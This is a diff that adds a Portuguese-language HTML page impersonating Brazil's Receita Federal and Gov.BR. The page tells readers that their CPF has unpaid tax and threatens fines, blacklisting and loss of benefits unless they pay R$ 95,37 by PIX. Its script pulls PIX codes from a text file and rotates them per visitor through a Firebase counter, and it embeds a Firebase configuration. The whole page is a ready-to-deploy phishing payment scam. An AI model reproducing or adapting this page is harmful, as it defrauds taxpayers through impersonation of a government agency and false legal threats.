@@ -1,0 +1,239 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Regularização Financeira</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            margin: 0;
+            padding: 0;
+            background-color: #f4f4f4;
+        }
+        .container {
+            max-width: 800px;
+            margin: 20px auto;
+            padding: 20px;
+            background-color: #fff;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        }
+        #logo {
+            width: 250px;
+            height: 250px;
+            margin: 0 auto 20px;
+            display: block;
+        }
+        .content {
+            margin-bottom: 20px;
+            text-align: left;
+        }
+        .content p {
+            margin: 10px 0;
+        }
+        .pix-key-container {
+            word-wrap: break-word; /* Quebra linhas longas */
+            overflow-wrap: break-word; /* Compatível com navegadores mais novos */
+            text-align: center; /* Centraliza o texto */
+            background-color: #f0f0f0;
+            padding: 10px;
+            border-radius: 5px;
+            font-family: monospace; /* Facilita leitura de textos longos */
+        }
+        button {
+            background-color: #007bff;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            font-size: 16px;
+            cursor: pointer;
+            border-radius: 5px;
+            margin-top: 20px;
+        }
+        button:hover {
+            background-color: #0056b3;
+        }
+        footer {
+            background-color: #333;
+            color: white;
+            padding: 10px 0;
+            position: fixed;
+            width: 100%;
+            bottom: 0;
+            text-align: center;
+        }
+    </style>
+    <!-- SweetAlert2 -->
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+</head>
+<body>
+    <div class="container">
+        <img id="logo" src="logo.png" alt="Logo">
+        <div class="content">
+            <h1>Regularização CPF / CNPJ </h1>
+            <p>Prezado(a) Contribuinte, após a abertura do seu CNPJ no dia 05/06/2026 constatamos irregularidades no seu CPF.</p>
+            <p>Verificamos em nossos registros que existe pendências relacionadas na entrega do seu Imposto de Renda.</p>
+            <p>A inadimplência do pagamento resultará na inclusão do débito na dívida ativa da União, gerando protestos e a negativação do CNPJ/CPF em órgãos de proteção ao crédito.</p>
+<p> Este e-mail é monitorado automaticamente, considerando a data atual como vencimento. Caso ultrapasse o prazo, haverá cobrança de juros e multa diária no valor de R$ 15,32. previstos no Art da Lei 10.522 de 19 de Julho de 2002  </p>            
+<p>Para evitar maiores transtornos, pedimos que regularize o valor devido através do código PIX copia e cola o quanto antes.</p>
+
+            <p><strong>Valor Pendente:</strong> R$ 95,37</p>
+            <p><strong>Código Pix copia e cola para regularização:</strong></p>
+            <div id="linha-atual" class="pix-key-container">
+               Carregando...
+            </div>
+         <button onclick="copiarLinha()">Copiar Código Pix Copia e Cola</button>
+
+
+
+            <p>Consequências do Não Pagamento:</p>
+            <ul>
+                <li>Juros e Penalidades Adicionais: O débito poderá ser acrescido de encargos e multas.</li>
+                <li>Suspensão de Benefícios Previdenciários: O atraso pode bloquear o acesso a benefícios, como aposentadoria e auxílio-doença.</li>
+                <li>Cancelamento do CNPJ/CPF: O registro da empresa poderá ser revogado se a pendência não for quitada.</li>
+                <li>Impedimentos em Certidões Fiscais: O não pagamento dificultará a emissão de certidões negativas, comprometendo transações financeiras.</li>
+                <li>Barreiras em Novos Negócios: Sua empresa poderá encontrar dificuldades em estabelecer contratos e parcerias comerciais.</li>
+
+		<br>
+		<li> Receita Federal - GOV.BR </li>
+            </ul>
+        </div>
+    </div>
+    <br><br><br>
+    <footer>
+        Gov.BR
+    </footer>
+    <script>
+        function copyPixKey() {
+            const pixKey = document.getElementById('pix-key').textContent;
+            navigator.clipboard.writeText(pixKey).then(() => {
+                Swal.fire({
+                    title: 'Sucesso!',
+                    text: 'Código Pix copiado com sucesso.',
+                    icon: 'success',
+                    confirmButtonText: 'OK'
+                });
+            }).catch(err => {
+                console.error('Erro ao copiar a chave PIX: ', err);
+            });
+        }
+    </script>
+
+
+
+
+
+
+
+
+
+
+<script type="module">
+import { initializeApp } from "https://www.gstatic.com/firebasejs/12.0.0/firebase-app.js";
+import { getDatabase, ref, runTransaction } from "https://www.gstatic.com/firebasejs/12.0.0/firebase-database.js";
+
+// 🔧 Firebase config
+const firebaseConfig = {
+   apiKey: "AIzaSyBAdj2iWBXXR-zl3WjVQvzfbQYgzlf0URs",
+   authDomain: "contador-17913.firebaseapp.com",
+   databaseURL: "https://contador-17913-default-rtdb.firebaseio.com",
+   projectId: "contador-17913",
+   storageBucket: "contador-17913.firebasestorage.app",
+   messagingSenderId: "596745198399",
+   appId: "1:596745198399:web:e14ad9228749ca02c3518a"
+};
+
+const app = initializeApp(firebaseConfig);
+const db = getDatabase(app);
+
+let linhaAtual = "";
+
+/* =========================
+   📄 Carregar linhas
+========================= */
+async function carregarLinhas() {
+    try {
+        const res = await fetch("linhas.txt", { cache: "no-store" });
+
+        if (!res.ok) throw new Error("Erro ao carregar linhas.txt");
+
+        const texto = await res.text();
+
+        return texto
+            .split("\n")
+            .map(l => l.trim())
+            .filter(Boolean);
+
+    } catch (err) {
+        console.error(err);
+        return [];
+    }
+}
+
+/* =========================
+   🔢 Incrementar contador (Firebase)
+========================= */
+async function proximoIndice() {
+    const contadorRef = ref(db, "contador");
+
+    const result = await runTransaction(contadorRef, (valor) => {
+        if (valor === null) return 1;
+        return valor + 1;
+    });
+
+    return result.snapshot.val() - 1;
+}
+
+/* =========================
+   🚀 Inicialização
+========================= */
+async function iniciar() {
+    const el = document.getElementById("linha-atual");
+
+    el.textContent = "Carregando...";
+
+    const linhas = await carregarLinhas();
+
+    if (!linhas.length) {
+        el.textContent = "Nenhum item encontrado.";
+        return;
+    }
+
+    const contador = await proximoIndice();
+
+    const indice = contador % linhas.length;
+
+    linhaAtual = linhas[indice];
+
+    el.textContent = linhaAtual;
+}
+
+/* =========================
+   📋 Copiar
+========================= */
+window.copiarLinha = async function () {
+    try {
+        await navigator.clipboard.writeText(linhaAtual);
+
+        if (typeof Swal !== "undefined") {
+            Swal.fire({
+                title: "Copiado!",
+                text: "Código Pix copiado com sucesso.",
+                icon: "success"
+            });
+        } else {
+            alert("Copiado!");
+        }
+
+    } catch (err) {
+        console.error(err);
+        alert("Erro ao copiar.");
+    }
+};
+
+iniciar();
+</script>
+</body>
+</html>
